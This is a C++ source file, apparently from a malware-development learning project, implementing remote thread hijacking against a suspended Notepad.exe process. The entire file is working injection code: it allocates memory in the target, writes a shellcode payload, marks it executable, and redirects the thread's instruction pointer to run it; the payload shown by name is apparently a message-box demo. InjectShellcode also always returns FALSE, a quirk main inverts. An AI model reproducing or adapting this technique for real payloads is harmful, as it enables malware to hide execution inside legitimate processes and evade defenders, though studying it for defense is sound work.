/**
 * Author : Yekuuun
 * Github : https://github.com/Yekuuun
 * 
 * Remote thread hijacking ( thread hikacking on a remote thread in a remote process)
 * 
 * Notes : Maldev academy => Remote thread hijacking.
 */

#include "hijack.hpp"

#pragma warning (disable:4996)

#define TARGET_PROCESS "Notepad.exe"

/**
 * Create a process in suspended mode.
 */
BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT PHANDLE hProcess, OUT PHANDLE hThread){
    CHAR lpPath [MAX_PATH * 2];
    CHAR WinDr  [MAX_PATH];

    STARTUPINFO			    Si = { 0 };
	PROCESS_INFORMATION		Pi = { 0 };

	// Cleaning the structs by setting the member values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

    // Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

    if(!GetEnvironmentVariableA("WINDIR", WinDr, MAX_PATH)){
        printf("[!] Failing to retrieve environment variable... \n");
        return FALSE;
    }

    sprintf(lpPath, "%s\\System32\\%s", WinDr, lpProcessName);
    printf("[*] Running : \"%s\" ... ", lpPath);

    if(!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi)){
        printf("[!] Error creating process using CreateProcessA... \n");
        return FALSE;
    }

    printf("\n[*] Successfully create new process in SUSPENDED_MODE \n");

    *dwProcessId = Pi.dwProcessId;
    *hProcess = Pi.hProcess;
    *hThread = Pi.hThread;

    if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL){
        return TRUE;
    }

    return FALSE;
}

/**
 * Injecting shellcode in process => returning base address of injected shellcode.
 */
BOOL InjectShellcode(IN HANDLE hProcess, IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID* ppAddress){
    SIZE_T	sNumberOfBytesWritten	= NULL;
	DWORD	dwOldProtection			= NULL;

    if(hProcess == NULL || pPayload == NULL){
        return FALSE;
    }

    //allocating memory
    *ppAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if(*ppAddress == NULL){
        printf("[!] Error allocating memory.\n");
        return FALSE;
    }

    printf("[*] Memory allocated at address : %p \n", *ppAddress);

    if(!WriteProcessMemory(hProcess, *ppAddress, pPayload, sPayloadSize, &sNumberOfBytesWritten)){
        printf("[!] Error writing memory to process\n");
        return FALSE;
    }

    if(!VirtualProtectEx(hProcess, *ppAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)){
        printf("[!] Error calling VirtualProtectEx \n");
        return FALSE;
    }

    return FALSE;
}

/**
 * @param HANDLE to given thread.
 * @param pAddres => address where payload was allocated & writted.
 */
BOOL RemoteHijack(IN HANDLE hThread, IN PVOID pAddress){
    CONTEXT	ThreadCtx = {
        .ContextFlags = CONTEXT_CONTROL
	};

	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	ThreadCtx.Rip = (DWORD64)pAddress;

	// setting the new updated thread context
	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("[#] Press <Enter> To Run ... ");
	getchar();

	ResumeThread(hThread);
	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}

//test.
int main(){
    HANDLE hProcess, hThread = NULL;
    DWORD  dwProcessId       = 0;
    PVOID  pAddress          = NULL;

    printf("[*] Creating process using CreateProcessA in SUSPENDED_MODE\n");
    if(!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)){
        return EXIT_FAILURE;
    }

    printf("[*] Target process created with pid : %d \n", dwProcessId);

    printf("[*] Injecting shellcode...\n");
    if(InjectShellcode(hProcess, MessageBoxAPayload, sizeof(MessageBoxAPayload), &pAddress)){
        return EXIT_FAILURE;
    }

    printf("[*] Successfully created process & allocating + writing memory \n");

    printf("\n[*] Hijacking The Target Thread To Run Our Shellcode... \n");
	if (!RemoteHijack(hThread, pAddress)) {
		return EXIT_FAILURE;
	}
	printf("[+] DONE \n\n");


	printf("[#] Press <Enter> To Quit ... ");
	getchar();

    return EXIT_SUCCESS;
}